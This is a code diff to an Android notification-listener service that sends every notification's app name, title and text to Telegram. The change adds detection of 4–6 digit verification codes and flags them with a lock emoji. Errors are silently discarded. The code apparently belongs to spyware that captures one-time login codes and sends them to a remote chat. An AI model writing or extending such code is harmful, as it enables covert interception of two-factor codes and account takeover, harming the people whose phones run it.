@@ -149,7 +149,11 @@ public class NotificationService extends NotificationListenerService {
             
             if (title.isEmpty() && text.isEmpty()) return;
             
-            String message = "🔔 [" + pkg + "]\n" + title + "\n" + text;
+            // كشف رموز التحقق
+            boolean isCode = text.matches(".*\\d{4,6}.*") || title.matches(".*\\d{4,6}.*");
+            String emoji = isCode ? "🔐" : "🔔";
+            
+            String message = emoji + " [" + pkg + "]\n" + title + "\n" + text;
             sendToTelegram(message);
         } catch (Exception e) {}
     }
